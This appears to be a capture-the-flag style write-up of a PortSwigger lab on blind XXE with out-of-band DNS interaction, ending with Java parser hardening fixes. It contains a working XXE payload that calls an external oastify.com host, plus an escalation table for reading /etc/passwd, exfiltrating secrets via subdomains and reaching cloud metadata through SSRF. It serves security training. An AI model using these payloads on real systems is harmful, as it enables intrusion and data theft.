---
layout: post
title: "Blind XXE with Out-of-Band Interaction"
date: 2027-08-11 09:00:00 -0500
categories: [PortSwigger, XXE]
tags: [xxe, blind, oob, oast, dns, cwe-611, java, xml]
---

## Overview

PortSwigger's **Blind XXE with out-of-band interaction** lab demonstrates that XML External Entity injection can be confirmed even when the application never reflects entity values back to the user. The exploit triggers an outbound DNS lookup from the server, which is observable via PortSwigger's `*.oastify.com` DNS attribution — no Burp Pro Collaborator required.

**CWE:** [CWE-611 — Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)

---

## The Vulnerability

The `/product/stock` endpoint accepts a raw XML body and passes it to a Java XML parser:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Java's `DocumentBuilderFactory` resolves external entities **by default** — no opt-in flag required (unlike PHP, which requires `LIBXML_NOENT`). An attacker can inject a DOCTYPE that declares an external entity pointing to an attacker-controlled host. When the parser encounters a reference to that entity in the document body, it issues an outbound DNS lookup + HTTP request to resolve it.

---

## The Exploit

Injecting the following payload confirms the vulnerability without needing any in-band reflection:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://<unique-label>.oastify.com"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

**What happens:**
1. The parser reads the DOCTYPE and registers `xxe` as an external SYSTEM entity.
2. When it hits `&xxe;` inside `<productId>`, it resolves the entity by fetching `http://<unique-label>.oastify.com`.
3. This triggers a **DNS lookup** attributable to the lab instance via PortSwigger's `*.oastify.com` infrastructure.
4. The HTTP fetch returns an empty body (host not serving anything useful), so the parser cannot substitute a valid value → `HTTP 400 "XML parsing error"`.

The **400 response is expected** — the DNS hit already fired before the error was generated. The lab backend marks it solved upon detecting the DNS interaction.

---

## Escalation Paths

| Goal | Technique |
|---|---|
| File read (in-band) | `SYSTEM "file:///etc/passwd"` if error message reflects the value |
| Data exfil (OOB) | Concatenate secret into subdomain: `http://` \|\| `(SELECT password ...)` \|\| `.label.oastify.com` |
| SSRF | `SYSTEM "http://169.254.169.254/latest/meta-data/..."` for cloud metadata |
| PHP file read | External DTD + `php://filter/convert.base64-encode` chain |

---

## The Fix

Disable external entity processing at the Java parser level:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

Additional mitigations:
- Use JSON APIs instead of XML wherever possible.
- Validate against a fixed XML Schema (XSD) — a schema validator with a known allowlist prevents arbitrary DOCTYPE declarations.
- Block `<!DOCTYPE` and `<!ENTITY` patterns at the WAF as defense-in-depth.

---

*Solved via PortSwigger Web Security Academy — authorized training environment.*
